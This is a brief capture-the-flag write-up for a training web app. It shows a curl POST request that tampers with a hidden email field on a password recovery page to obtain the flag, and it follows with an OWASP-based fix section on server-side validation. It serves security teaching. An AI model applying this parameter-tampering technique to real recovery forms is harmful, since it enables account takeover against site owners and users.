# Gibbe password pls

## Exploit
On the password recovery page `${URL}/?page=recover` we can see a hidden form containing the webmaster email.
```html
<form action="#" method="POST">
        <input type="hidden" name="mail" value="webmaster@borntosec.com" maxlength="15">
        <input type="submit" name="Submit" value= "Submit">
</form>
```

We'll exploit this by sending a POST request with our own email using cURL.
```shell
$ curl -s -X POST --data "mail=xperrin@student.42.fr&Submit=Submit" "${URL}/?page=recover" | grep -i flag
<center><h2 style="margin-top:50px;"> The flag is : [REDACTED]</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center>
```

## Fix
[OWASP](https://owasp.org/www-community/attacks/Web_Parameter_Tampering)
The server should never assume that the data the client sent is trustworthy and should validate every argument.
Here it shouldn't let the user specify a mail address at all and should instead retrieve it server-side.
Also, hidden fields should never be used with secure information.
